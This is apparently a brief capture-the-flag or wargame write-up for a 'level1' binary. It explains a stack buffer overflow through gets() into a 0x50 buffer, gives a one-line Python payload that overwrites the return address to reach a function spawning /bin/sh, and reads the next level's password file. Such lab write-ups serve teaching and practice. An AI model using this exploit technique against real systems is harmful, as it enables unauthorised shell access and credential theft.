open with gdb, layout asm find that there is a function named run that executes system(/bin/sh)
look that there is a buffer of 0x50 in main that gets called by gets()
so the thing here is to write 76 * "A" (garbage) + the address of the function run
and to maintain the child process open.
so we're doing :
cat <(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1]') - | ./level1
then cat ../level2/.pass
